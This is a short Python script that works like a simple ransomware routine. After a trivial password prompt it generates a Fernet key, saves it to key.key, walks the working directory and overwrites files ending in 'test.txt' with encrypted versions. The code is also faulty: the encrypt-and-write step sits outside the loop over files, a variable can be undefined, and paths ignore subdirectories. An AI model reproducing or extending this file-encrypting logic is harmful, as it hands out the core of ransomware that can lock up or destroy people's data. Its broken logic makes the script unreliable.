# -*- coding: utf-8 -*-



from cryptography.fernet import Fernet
import os

safeguard = input("please enter the safeguard password:  ")
if safeguard != 'start' :
    quit()

key = Fernet.generate_key()

with open("key.key","wb") as f:
    f.write(key)
    
    fernet = Fernet(key)
    
    for i in os.walk(os.getcwd()):
        for p in i[2]:
            if str(p).endswith("test.txt"):
                with open(str(p),"r") as f:
                    data=f.read()
            
        encrypted = fernet.encrypt(data.encode())
        with open(str(p),"wb") as f:
            f.write(encrypted)
